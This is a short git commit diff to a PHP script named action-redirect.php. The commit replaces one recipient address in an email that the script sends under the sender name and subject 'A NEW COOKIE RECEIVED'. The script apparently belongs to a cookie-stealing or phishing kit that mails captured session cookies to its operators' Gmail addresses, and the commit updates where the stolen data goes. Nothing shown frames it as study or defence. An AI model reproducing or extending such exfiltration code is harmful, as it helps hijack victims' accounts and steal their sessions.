037faab6ed5ebe1af7be13536a8193db7edadd4f
azharalee1995 <147185853+azharalee1995@users.noreply.github.com>
2024-02-25 04:04:22 +0500

    Update action-redirect.php

--- action-redirect.php
+++ action-redirect.php
@@ -37,7 +37,7 @@ EOF;
   
   $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
   $mail->addAddress('kk442242@gmail.com', 'Receiver');
-  $mail->addAddress('info.marymargarett@gmail.com', 'Receiver');
+  $mail->addAddress('sponsoredads13@gmail.com', 'Receiver');
   $mail->Subject = 'A NEW COOKIE RECEIVED';
   $mail->Body    = 'Please check the link';
 
